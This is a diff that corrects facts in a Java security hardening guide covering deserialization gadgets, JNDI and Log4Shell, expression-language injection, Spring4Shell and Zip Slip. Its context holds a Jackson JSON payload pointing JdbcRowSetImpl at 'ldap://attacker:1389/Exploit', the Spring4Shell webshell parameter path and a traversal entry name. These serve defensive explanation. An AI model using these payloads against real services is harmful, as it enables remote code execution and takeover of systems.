@@ -10,8 +10,7 @@
 
 > **Researchers:**
 > - **Chris Frohoff** (@frohoff) — ysoserial author; AppSecCali 2015 "Marshalling Pickles"
->   (with Gabriel Lawrence); canonical Java-deserialization payload toolkit; coined Property-
->   Oriented Programming for Java. `frohoff.github.io/appseccali-marshalling-pickles/`,
+>   (with Gabriel Lawrence); canonical Java-deserialization payload toolkit. `frohoff.github.io/appseccali-marshalling-pickles/`,
 >   `github.com/frohoff/ysoserial`.
 > - **Gabriel Lawrence** (@gebl) — Co-presenter of AppSecCali 2015 "Marshalling Pickles";
 >   co-discovered the Apache Commons Collections deserialization gadget that became the
@@ -28,7 +27,7 @@
 >   Java marshallers, not specific to `ObjectInputStream`; contributed the C3P0 gadget to
 >   ysoserial. `github.com/mbechler/marshalsec`.
 > - **Markus Wulftange** — Principal Security Researcher, CODE WHITE GmbH; RichFaces EL bypass,
->   AMF3 protocol exploitation, SAP J2EE Engine deserialization, JMX RCE technique, Symantec
+>   AMF3 protocol exploitation, Symantec
 >   Endpoint Protection vulnerability disclosures. `codewhitesec.blogspot.com`.
 > - **Brian Goetz** — Java Language Architect at Oracle; spec lead for JSR-335 (Lambda) and the
 >   modern Java evolution path (records, sealed classes, pattern matching, virtual threads);
@@ -91,8 +90,8 @@ and *any* class on the transitive classpath (the gadget). Apache Commons Collect
 contain a bug — `Transformer` was correct for data-transformation pipelines. The footgun was
 that `ObjectInputStream.readObject()` could reach `Transformer.transform()` through a
 serialized object graph, and the deserializing-service developer had no visibility into the
-classpath-wide consequence. ysoserial's payload directory has grown from 5 (2015) to 30+
-(2026), each one a gadget chain in some popular library. The classpath surface is unbounded;
+classpath-wide consequence. ysoserial's payload directory now lists 30+ payloads,
+each one a gadget chain in some popular library. The classpath surface is unbounded;
 the sink surface is small. **Eliminate the sink, not the gadgets.**
 
 ### Scope
@@ -126,7 +125,7 @@ the stream is sufficient.
 The Frohoff-Lawrence AppSecCali 2015 talk demonstrated this is not a "patch the library"
 problem. ysoserial's README: "the vulnerability lies in the application performing unsafe
 deserialization and NOT in having gadgets on the classpath." Each gadget-library patch (Apache
-Commons Collections, Spring, Hibernate, Apache CXF, Groovy, ROME, Click, Vaadin, Wicket,
+Commons Collections, Spring, Hibernate, Groovy, ROME, Click, Vaadin, Wicket,
 JSON-IO, BeanUtils, BeanShell, JBoss, C3P0) only removed one weapon; ysoserial currently lists
 30+ payloads. Cross-link `deserialization_expertise.md` §2 for the gadget catalog. The
 architectural fix is removing the sink: do not call `ObjectInputStream.readObject()` on
@@ -175,12 +174,12 @@ Limits: (1) **one-direction** — Bechler / An Trinh (2019) showed RMI client-si
 deserialization of responses isn't filtered; force the target into client role to bypass.
 (2) **bean-property marshallers unaffected** — SnakeYAML, Jackson default typing, XStream
 don't go through `ObjectInputStream`. (3) **opt-in** — default-configured `ObjectInputStream`
-has no filter. (4) **subtle syntax** — `!*` discipline matters. JDK 17 strict mode
-(`jdk.serialFilterFactory`) tightens defaults but cannot retrofit every legacy call.
+has no filter. (4) **subtle syntax** — `!*` discipline matters. JDK 17's JVM-wide filter
+factory (`jdk.serialFilterFactory`) helps but cannot retrofit every legacy call.
 
 ### Real CVE corpus (selected)
 
-CVE-2015-7501 (Commons Collections), CVE-2015-4852 (JBoss AS), CVE-2016-1000027 (Spring
+CVE-2015-7501 (Commons Collections), CVE-2015-4852 (Oracle WebLogic), CVE-2016-1000027 (Spring
 HttpInvokerServiceExporter), CVE-2017-12149 (JBoss ReadOnlyAccessFilter), CVE-2017-9805
 (Struts2 REST plugin / XStream), CVE-2019-2725 + CVE-2020-2883 (Oracle WebLogic),
 CVE-2021-44228 (Log4Shell — §4), CVE-2022-1471 (SnakeYAML — §3), CVE-2022-22963 (Spring Cloud
@@ -206,8 +205,8 @@ JDK-only gadget is `com.sun.rowset.JdbcRowSetImpl`:
  "dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}
 ```
 
-Jackson sets `dataSourceName` via the bean setter, then `autoCommit=true`, which calls
-`getConnection()` → JNDI lookup on the attacker URL → class fetch + instantiation. RCE in
+Jackson sets `dataSourceName` via the bean setter, then `autoCommit=true`, which triggers a
+JNDI lookup on the attacker URL → class fetch + instantiation. RCE in
 three setter calls, no external gadget library.
 
 ### `enableDefaultTyping` and the 2.10 hardening
@@ -231,9 +230,9 @@ footgun. Source: `cowtowncoder.medium.com/jackson-2-10-safe-default-typing-2d018
 Fastjson (Alibaba) was the most-exploited Java JSON library in 2017-2022. The `@type` key in
 incoming JSON specified the class to instantiate, with no allowlist. Defensive evolution shows
 the blacklist pattern in real time: `AutoTypeCheckHandler` was added; researchers bypassed it
-(leading slashes, MessageDigest abuse, encoding). Fastjson 1.2.83 enabled `safeMode` which
+(leading slashes, MessageDigest abuse, encoding). Fastjson 1.2.68 introduced `safeMode` which
 disables `autoType` entirely; Fastjson 2.x rebuilt around allowlist-by-default. CVE-2022-25845
-documents the 1.2.83 escape; CVE-2017-18349 is the original autotype RCE. Same lesson as
+is an autoType bypass fixed in 1.2.83; CVE-2017-18349 is the original autotype RCE. Same lesson as
 Jackson: blacklists are permanently broken.
 
 ### Gson — safer by default, with caveats
@@ -243,7 +242,7 @@ information is required at the call site (`Gson.fromJson(json, Dog.class)`); the
 not instantiate any class other than the one passed. Caveats:
 `RuntimeTypeAdapterFactory` re-introduces polymorphism with a developer-provided type-map
 (allowlist-by-construction; safe when used correctly); custom `TypeAdapter`s that call
-reflection can re-introduce the gadget surface; Gson 2.9.0 added `ReflectionAccessFilter` for
+reflection can re-introduce the gadget surface; Gson 2.9.1 added `ReflectionAccessFilter` for
 JDK-internal-class hardening.
 
 ### SnakeYAML and CVE-2022-1471
@@ -267,7 +266,7 @@ Yaml yaml = new Yaml(new SafeConstructor());   // safe — no arbitrary type ins
 
 The `!!javax.script.ScriptEngineManager` payload from Bechler's marshalsec corpus (§3 of
 `deserialization_expertise.md`) was the canonical exploit. SnakeYAML downstream consumers —
-Spring Boot config parsing, Apache Camel, ESAPI, Apache Brooklyn, JBoss Resteasy — all needed
+Spring Boot config parsing, Apache Camel, Apache Brooklyn, JBoss Resteasy — all needed
 the fix propagated.
 
 Sources: `snyk.io/blog/unsafe-deserialization-snakeyaml-java-cve-2022-1471/`,
@@ -306,11 +305,11 @@ attack class.
 ### Patch evolution
 
 Oracle's response was incremental: Java 8u121 (Jan 2017) restricted RMI codebase loading by
-default (`java.rmi.server.useCodebaseOnly=true`); Java 8u191 (Oct 2018, CVE-2018-3149)
+default (`com.sun.jndi.rmi.object.trustURLCodebase=false`); Java 8u191 (Oct 2018, CVE-2018-3149)
 restricted LDAP codebase loading (`com.sun.jndi.ldap.object.trustURLCodebase=false`). Both are
 *defaults*, not enforced policy.
 
-The attack class survived. Bechler identified post-patch gadgets without remote codebase
+The attack class survived. Veracode research (2019) identified post-patch gadgets without remote codebase
 loading: `org.apache.naming.factory.BeanFactory` (Tomcat) takes a `forceString` attribute and
 an EL-template attribute; looking up a Reference with these triggers EL evaluation, invoking
 `Runtime.exec()`. Tomcat-on-classpath is sufficient. The lesson: the codebase-loading patch
@@ -323,8 +322,8 @@ Log4j2's "message lookup substitution" interpreted `${...}` patterns in log mess
 logged could trigger a JNDI lookup. The catastrophe of Log4Shell was not the JNDI primitive —
 Muñoz/Mirosh had established the danger in 2016 — but the *amplifier*: a logging library
 universally deployed across Java services, with JNDI dispatch enabled by default. Mitigation
-evolution: Log4j 2.15 removed default message-lookup substitution (bypassable); 2.16 removed
-the JNDI lookup entirely; 2.17 fixed CVE-2021-45105 DoS; `JndiLookup` class removal was the
+evolution: Log4j 2.15 removed default message-lookup substitution (bypassable); 2.16 disabled
+JNDI by default and removed message lookups entirely; 2.17 fixed CVE-2021-45105 DoS; `JndiLookup` class removal was the
 workaround for environments that couldn't upgrade.
 
 ### `Reference` server gadget surface
@@ -456,7 +455,7 @@ Source: `openjdk.org/jeps/411`, `openjdk.org/jeps/486`,
 
 - **CVE-2015-7501** Apache Commons Collections — `InvokerTransformer` is the reflection gadget
 - **CVE-2017-9805** Apache Struts2 REST plugin XStream — reflection-driven instantiation
-- **CVE-2019-17564** Apache Dubbo Hessian2 — `Class.forName` on attacker-controlled name
+- **CVE-2019-17564** Apache Dubbo HTTP remoting — unsafe deserialization of a POSTed Java object
 - **CVE-2021-44228** Log4j2 JNDI — `Context.lookup` reaches `Class.forName` through
   `Reference.getFactoryClassName()`
 - **CVE-2022-22965** Spring4Shell — `class.module.classLoader` data binding (see §10)
@@ -479,11 +478,11 @@ language) in the host JVM with full access to Java classes. Nashorn defaults exp
 Nashorn was the JDK 8 default JavaScript engine. JEP 372 removed it from the JDK in version
 15 (2020). The replacement is GraalVM JavaScript, which can be added as a dependency
 (`org.graalvm.js:js`) and exposed via the same `ScriptEngineManager` API. The footgun is
-identical: `eval(attackerString)` from GraalVM JS is RCE just like Nashorn.
+identical once host access is enabled: `eval(attackerString)` from GraalVM JS is RCE just like Nashorn.
 
 GraalVM JS adds a `polyglot` mode with stricter sandboxing controls. Configured correctly,
-it can restrict Java interop. But "configured correctly" is opt-in; the default exposes
-`Java.type` and full reflection.
+it can restrict Java interop. Its JSR-223 ScriptEngine defaults `polyglot.js.allowHostAccess`
+and related host-access options to false unless `js.nashorn-compat` is set.
 
 ### Spring Expression Language (SpEL)
 
@@ -491,9 +490,7 @@ SpEL is Spring's expression language: `@Value("#{...}")`, `@PreAuthorize("#{...}
 property resolution, MVC view templates. SpEL has access to
 `T(java.lang.Runtime).getRuntime().exec(...)` for arbitrary static-method invocation —
 attacker-controlled SpEL is RCE. Hardening: `SimpleEvaluationContext` (instead of
-`StandardEvaluationContext`) disables type references and constructor invocation. Spring
-Security method-security defaults use `SimpleEvaluationContext` post-2018; legacy
-`StandardEvaluationContext` uses remain. CVE-2022-22963 (Spring Cloud Function) shipped
+`StandardEvaluationContext`) disables type references and constructor invocation. CVE-2022-22963 (Spring Cloud Function) shipped
 `StandardEvaluationContext` on the routing-expression header path; fix added a separate
 `headerEvalContext` based on `SimpleEvaluationContext`. Source: `spring.io/security/cve-2022-22963/`.
 
@@ -501,11 +498,9 @@ Security method-security defaults use `SimpleEvaluationContext` post-2018; legac
 
 OGNL (Struts2 ValueStack) has produced 8+ critical RCEs: CVE-2010-1870, CVE-2017-5638
 (Equifax), CVE-2018-11776, CVE-2020-17530, CVE-2024-53677 (file-upload mass-assignment).
-Struts 7.0.0+ removes the legacy parameter-name OGNL evaluation entirely.
 
-MVEL (Drools, jBPM, KIE-Server): CVE-2021-26117 (Apache ActiveMQ ServerInfo).
-JEXL (Apache Commons Configuration): CVE-2021-44832 was the Log4j2 follow-up via JDBC Appender
-config injection.
+MVEL (Drools, jBPM, KIE-Server).
+JEXL (Apache Commons Configuration).
 EL (JSP/JSF/Jakarta Faces, JSR-341): `${...}` in JSF templates evaluates EL; Tomcat
 `BeanFactory` JNDI gadget (§4) abuses Tomcat's EL evaluator.
 
@@ -591,8 +586,8 @@ Source: `cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_C
 ### `Cipher.getInstance("AES")` — ECB by default
 
 `Cipher.getInstance("AES")` is incomplete — it specifies algorithm but not mode or padding.
-JCA: "Implementations may default to a specific mode and padding when the transformation is
-incomplete." Oracle's SunJCE defaults to `AES/ECB/PKCS5Padding`. ECB is unsafe for any data
+JCA: "If no mode or padding is specified, provider-specific default values for the mode and
+padding scheme are used." Oracle's SunJCE defaults to `AES/ECB/PKCS5Padding`. ECB is unsafe for any data
 with structural regularities (the canonical Tux-image demonstration). Defense: always specify
 the full transformation (`AES/GCM/NoPadding`, `AES/CBC/PKCS5Padding` with explicit IV).
 Better: use a high-level API like Tink or Bouncy Castle's `AEADBlockCipher`.
@@ -648,7 +643,7 @@ For TLS configuration, certificate validation, KDF choice, post-quantum migratio
 `synchronized(this)` exposes the lock as public surface. Any code holding a reference can
 `synchronized(instance) { ... }` and acquire the same lock — unintended cross-class
 contention, exploitable as a DoS vector with attacker-influenced contending code (uploaded
-plugins, third-party listeners). Goetz's *JCiP* §2.4 recommends private final lock objects:
+plugins, third-party listeners). Goetz's *JCiP* (Listing 4.3, guarding state with a private lock) recommends private final lock objects:
 
 ```java
 private final Object lock = new Object();
@@ -702,8 +697,8 @@ contention. Goetz's *JCiP* §3.1 ("Visibility") is the canonical exposition.
 
 `Thread.stop()` throws `ThreadDeath` at an arbitrary point in the target thread, including
 mid-`synchronized`-block. Locks are released but intermediate state is exposed half-finished.
-Replacement: `Thread.interrupt()` plus cooperative shutdown via `isInterrupted()`. JEP 462 /
-JEP 491 (JDK 21+) finalize the deprecation by removing `Thread.stop` entirely.
+Replacement: `Thread.interrupt()` plus cooperative shutdown via `isInterrupted()`. Since
+JDK 20, `Thread.stop` throws `UnsupportedOperationException` and `ThreadDeath` is deprecated for removal.
 
 ### `ThreadLocal` leaks in pooled threads
 
@@ -762,8 +757,9 @@ An HTTP request with parameters like
 `class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp` (plus
 directory, prefix, fileDateFormat) reconfigures Tomcat's `AccessLogValve` to write a JSP
 webshell to the web root. The next request to that JSP executes the webshell. The fix in
-Spring 5.3.18 / 5.2.20 explicitly blacklists `class.*` paths in the binder — the underlying
-footgun (data binder follows arbitrary property paths) remains; the patch is a denylist.
+Spring 5.3.18 / 5.2.20 adds checks in `CachedIntrospectionResults` so the ClassLoader is no
+longer reachable via `Class.getModule` — the underlying
+footgun (data binder follows arbitrary property paths) remains.
 Source: `nvd.nist.gov/vuln/detail/CVE-2022-22965`,
 `jfrog.com/blog/springshell-zero-day-vulnerability-all-you-need-to-know/`.
 
@@ -782,11 +778,11 @@ CVE candidate.
 
 ### Actuator endpoints — pre-2.0 default
 
-Spring Boot Actuator pre-2.0 exposed `/env`, `/heapdump`, `/trace`, `/loggers`, others
-unauthenticated by default. `/env` returns environment variables (often database passwords);
+Spring Boot Actuator before 1.5 exposed `/env`, `/heapdump`, `/trace`, others
+unauthenticated by default when Spring Security was absent; 1.5 secured sensitive endpoints by default. `/env` returns environment variables (often database passwords);
 `/heapdump` dumps the JVM heap; `/jolokia` (when bundled) was the JMX-over-HTTP gadget. Spring
-Boot 2.x defaults changed: only `/health` and `/info` are exposed without authentication.
-Legacy 1.x deployments retain the footgun. Cross-link to `distributed_authz_expertise.md` for
+Boot 2.0 changed the defaults: only `/health` and `/info` are exposed over the web, and 2.5 dropped
+`/info` from that default. Legacy pre-1.5 deployments retain the footgun. Cross-link to `distributed_authz_expertise.md` for
 the broader "internal endpoint exposed externally" failure mode.
 
 ### Spring Security configuration ordering
@@ -824,8 +820,8 @@ Cross-link to `code_review_expertise.md` §4 ("Absolute path handling is always 
 
 `ZipInputStream.getNextEntry().getName()` returns the entry's path as stored. An archive with
 `../../../tmp/evil.sh` extracted naively writes outside `targetDir`. Snyk's 2018 Zip Slip
-research catalogued thousands of vulnerable Java projects (AWS CodePipeline, Spring
-Integration, LinkedIn Pinot, Heron, Alibaba JStorm, Jenkins, Gradle). Same vulnerability class
+research catalogued thousands of vulnerable projects across ecosystems, including projects from
+Amazon, Spring/Pivotal, LinkedIn, Twitter, Alibaba, and Jenkins. Same vulnerability class
 applies to `tar`, `jar`, `war`, `cpio`, `apk`, `rar`, `7z`. Defense:
 
 ```java
@@ -906,9 +902,8 @@ interop into the Java type system with bounds-checked memory access.
 
 ### `sun.misc.Unsafe` — see §5
 
-`Unsafe.allocateInstance(Class)` constructs an object without invoking its constructor — the
-same primitive Java Serialization uses internally. Direct application use of `Unsafe` is
-deprecated by JEP 471.
+`Unsafe.allocateInstance(Class)` constructs an object without invoking its constructor. JEP 471 deprecates `Unsafe`'s
+memory-access methods for removal; `allocateInstance` is not among them.
 
 ### Garbage-collector behavior
 
@@ -995,7 +990,7 @@ hardening / containment block is present in the enclosing scope.
   OGNL, path traversal. `github.com/github/codeql/tree/main/java/ql/src/Security`.
 - **SpotBugs Find Security Bugs** — bytecode-aware (catches reflection patterns).
   `find-sec-bugs.github.io`.
-- **Trail of Bits Semgrep ruleset** — Temurin audit team open-sourced.
+- **Trail of Bits Semgrep ruleset**.
   `github.com/trailofbits/semgrep-rules`.
 - **OWASP Dependency-Check** — flags vulnerable transitive dependencies. Critical for the
   "gadget on the classpath" problem.
@@ -1084,10 +1079,10 @@ round of security research is likely to surface CVEs.
 
 ### Records (JEP 395, JDK 16+) and serialization
 
-Records auto-implement `Serializable` deterministically: the canonical constructor reconstructs
-the record from serialized state components. Records cannot define `readObject`, `writeObject`,
-`readObjectNoData`, `readExternal`, or `writeExternal` — the magic-method gadget surface is
-absent. The gadget surface reduces from "any `readObject` on any reachable class" to "any
+Serializable records are serialized deterministically: the canonical constructor reconstructs
+the record from serialized state components. For records, `readObject`, `writeObject`,
+`readObjectNoData`, `readExternal`, and `writeExternal` are ignored — that magic-method gadget surface is
+absent, though `writeReplace` and `readResolve` are still honored. The gadget surface reduces from "any `readObject` on any reachable class" to "any
 canonical constructor that performs a security-relevant operation." Records used as data
 carriers (no constructor side effects) are essentially safe to serialize.
 
@@ -1121,9 +1116,9 @@ JEP 444 (JDK 21) finalized virtual threads. Under-explored security questions:
 
 ### JEP 471 sealing `sun.misc.Unsafe` — post-2025 landscape
 
-JEP 471 phases out `sun.misc.Unsafe` with VarHandle + FFM as migration targets. Under-
-explored: what gadget chains relied on `Unsafe.allocateInstance` (constructor-bypass) for
-their terminal primitive? The transitional period (JDK 23-26) is a research opportunity as
+JEP 471 deprecates the memory-access methods of `sun.misc.Unsafe` for removal, with VarHandle +
+FFM as migration targets; `allocateInstance` is not among them and remains in the medium term.
+The transitional period (JDK 23-26) is a research opportunity as
 libraries migrate and gadget chains either break or move to new primitives.
 
 ### JEP 486 — permanently disabled Security Manager
